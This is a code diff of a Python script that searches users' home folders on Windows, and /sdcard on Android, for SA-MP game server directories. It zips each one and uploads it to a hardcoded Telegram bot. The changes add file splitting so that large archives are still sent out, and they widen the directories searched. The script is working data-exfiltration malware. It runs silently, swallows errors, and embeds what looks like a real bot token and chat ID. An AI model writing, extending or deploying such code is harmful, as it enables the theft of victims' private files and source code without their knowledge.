@@ -1,121 +1,224 @@
 import os
+import re
 import platform
 import shutil
 import requests
 
-# --- CONFIGURATION ---
+# ==========================
+# CONFIG
+# ==========================
 BOT_TOKEN = '8792427618:AAGY9Oo6TP0PtjZUdtGQ31i5m33cJNatjO0'
 CHAT_ID = '8447290071'
-# ---------------------
+
+MAX_FILE_SIZE_MB = 45
+CHUNK_SIZE = MAX_FILE_SIZE_MB * 1024 * 1024
+
+# ==========================
+# HELPERS
+# ==========================
+
+def safe_name(name):
+    name = re.sub(r'[<>:"/\\|?*]', '_', name)
+    name = name.replace(' ', '_')
+    return name.strip('_') or "SAMP_Server"
 
 def send_msg(text):
-    """Sends a status message to your Telegram bot."""
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     try:
-        requests.post(url, data={'chat_id': CHAT_ID, 'text': text})
-    except Exception:
+        requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            data={
+                "chat_id": CHAT_ID,
+                "text": text
+            },
+            timeout=30
+        )
+    except:
         pass
 
+def send_doc(file_path, caption=""):
+    try:
+        with open(file_path, "rb") as f:
+            r = requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
+                files={"document": f},
+                data={
+                    "chat_id": CHAT_ID,
+                    "caption": caption
+                },
+                timeout=300
+            )
+
+        try:
+            return r.json().get("ok", False)
+        except:
+            return False
+
+    except:
+        return False
+
 def get_search_paths():
-    """Detects platform environment and maps appropriate root directories."""
-    if platform.system() == "Windows":
-        # Searches Windows Downloads and user home (PC/Laptop)
-        return [os.path.join(os.path.expanduser("~"), "Downloads"), os.path.expanduser("~")]
-    
-    # Android Mobile / Termux direct internal storage root path
-    return ["/sdcard/"]
+    system = platform.system()
+
+    if system == "Windows":
+        home = os.path.expanduser("~")
+        return [
+            home,
+            os.path.join(home, "Desktop"),
+            os.path.join(home, "Downloads"),
+            os.path.join(home, "Documents")
+        ]
+
+    if os.path.exists("/sdcard"):
+        return ["/sdcard"]
+
+    return [os.path.expanduser("~")]
 
 def is_samp_server_dir(files_list, dirs_list):
-    """
-    Checks if the directory contains ANY signature SA-MP element.
-    If even one file or folder matches, the parent folder will be zipped.
-    """
-    # 1. Check for single file indicators (case-insensitive)
-    lower_files = [f.lower() for f in files_list]
-    if 'server.cfg' in lower_files:
+    files_lower = {f.lower() for f in files_list}
+    dirs_lower = {d.lower() for d in dirs_list}
+
+    if "server.cfg" in files_lower:
         return True
-        
-    # 2. Check for single folder indicators (case-insensitive)
-    lower_dirs = [d.lower() for d in dirs_list]
-    samp_signatures = {'gamemodes', 'filterscripts', 'pawno', 'scriptfiles', 'plugins', 'include'}
-    
-    # Returns True if any item in samp_signatures exists in lower_dirs
-    if not samp_signatures.isdisjoint(lower_dirs):
-        return True
-        
-    return False
+
+    signatures = {
+        "gamemodes",
+        "filterscripts",
+        "pawno",
+        "scriptfiles",
+        "plugins",
+        "include"
+    }
+
+    return bool(signatures.intersection(dirs_lower))
+
+def split_and_send_file(zip_path, folder_name, current_index, total_folders):
+    size_bytes = os.path.getsize(zip_path)
+
+    total_parts = (
+        size_bytes + CHUNK_SIZE - 1
+    ) // CHUNK_SIZE
+
+    send_msg(
+        f"📦 Splitting {folder_name}\n"
+        f"Parts: {total_parts}"
+    )
+
+    with open(zip_path, "rb") as source:
+
+        for part_num in range(1, total_parts + 1):
+
+            part_name = f"{zip_path}.part{part_num:03d}"
+
+            with open(part_name, "wb") as part:
+                part.write(source.read(CHUNK_SIZE))
+
+            caption = (
+                f"📁 {folder_name}\n"
+                f"Project {current_index}/{total_folders}\n"
+                f"Part {part_num}/{total_parts}"
+            )
+
+            send_doc(part_name, caption)
+
+            try:
+                os.remove(part_name)
+            except:
+                pass
+
+# ==========================
+# MAIN
+# ==========================
 
 def main():
-    search_paths = get_search_paths()
-    samp_directories = set()
-    
-    send_msg("🔍 [System Alert]: Initializing platform-specific deep scan for SA-MP structures...")
-    
-    # 1. Locate all unique target folders across the platform paths
-    for base_dir in search_paths:
-        if not os.path.exists(base_dir):
+    send_msg("🔍 Starting scan...")
+
+    found_folders = set()
+
+    for base in get_search_paths():
+
+        if not os.path.exists(base):
             continue
-            
+
         try:
-            for root, dirs, files in os.walk(base_dir, topdown=True):
-                # Speed optimization: bypass generic bulky OS data directories
-                dirs[:] = [d for d in dirs if not d.startswith('.') and d.lower() not in ['android', 'data', 'obb', 'node_modules']]
-                
+            for root, dirs, files in os.walk(base, topdown=True):
+
+                dirs[:] = [
+                    d for d in dirs
+                    if d.lower() not in {
+                        "android",
+                        "data",
+                        "obb",
+                        "node_modules"
+                    }
+                ]
+
                 if is_samp_server_dir(files, dirs):
-                    samp_directories.add(root)
-                    # Stop looking deeper into this folder once it's flagged for zipping
-                    dirs.clear() 
+                    found_folders.add(root)
+                    dirs.clear()
+
         except Exception as e:
-            send_msg(f"⚠️ Access warning on platform directory structure:\n{str(e)[:60]}")
+            send_msg(f"⚠️ Scan error: {str(e)[:100]}")
 
-    discovered_targets = sorted(list(samp_directories))
-    total_targets = len(discovered_targets)
+    folders = sorted(found_folders)
 
-    if total_targets == 0:
-        send_msg("❌ Scan finished. No SA-MP components found matching the criteria on this platform.")
+    if not folders:
+        send_msg("❌ No SA-MP folders found.")
         return
 
-    send_msg(f"📋 Scan Complete!\n📌 Found **{total_targets}** folder trees to package.\n\n⚙️ Compressing and streaming data...")
+    send_msg(f"✅ Found {len(folders)} SA-MP folders.")
 
-    # 2. Compress and upload each detected structure
-    for index, folder_path in enumerate(discovered_targets, 1):
-        folder_name = os.path.basename(folder_path) or "SAMP_Server"
-        archive_name = f"samp_package_{index}"
-        
-        send_msg(f"📦 Compressing ({index}/{total_targets}): `{folder_name}`...")
-        
+    for index, folder_path in enumerate(folders, start=1):
+
+        folder_name = os.path.basename(folder_path)
+
+        if not folder_name:
+            folder_name = f"SAMP_{index}"
+
+        archive_name = safe_name(folder_name)
+
         try:
-            # Package folder into zip archive
-            zip_file_path = shutil.make_archive(archive_name, 'zip', folder_path)
-            file_size_mb = os.path.getsize(zip_file_path) / (1024 * 1024)
-            
-            # Safeguard against Telegram's 50MB Bot limit
-            if file_size_mb > 50:
-                send_msg(f"⚠️ Skipping `{folder_name}`: Size ({file_size_mb:.2f} MB) exceeds Telegram's 50MB Bot limit.")
-                os.remove(zip_file_path)
-                continue
-                
-            # Stream the file to Telegram
-            with open(zip_file_path, 'rb') as archive_file:
-                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-                response = requests.post(url,
-                    files={'document': archive_file},
-                    data={
-                        'chat_id': CHAT_ID,
-                        'caption': f"📂 Environment: ({index}/{total_targets})\n📁 Name: {folder_name}\n💾 Size: {file_size_mb:.2f} MB"
-                    }
-                )
-                
-                if response.status_code != 200:
-                    send_msg(f"❌ Telegram API rejected archive for: {folder_name}")
-                    
-            # Delete local temporary zip file to save space
-            os.remove(zip_file_path)
-            
-        except Exception as e:
-            send_msg(f"⚠️ Error compiling package `{folder_name}`:\nDetail: {str(e)[:60]}")
+            send_msg(
+                f"📦 Compressing {folder_name}\n"
+                f"({index}/{len(folders)})"
+            )
 
-    send_msg("✅ Complete: Everything found has been processed and sent.")
+            zip_path = shutil.make_archive(
+                archive_name,
+                "zip",
+                folder_path
+            )
+
+            size_mb = os.path.getsize(zip_path) / (1024 * 1024)
+
+            if size_mb > MAX_FILE_SIZE_MB:
+
+                split_and_send_file(
+                    zip_path,
+                    folder_name,
+                    index,
+                    len(folders)
+                )
+
+            else:
+
+                send_doc(
+                    zip_path,
+                    f"📁 {folder_name}\n"
+                    f"Size: {size_mb:.2f} MB"
+                )
+
+            try:
+                os.remove(zip_path)
+            except:
+                pass
+
+        except Exception as e:
+            send_msg(
+                f"❌ Error processing {folder_name}\n"
+                f"{str(e)[:100]}"
+            )
+
+    send_msg("✅ Finished.")
 
 if __name__ == "__main__":
     main()
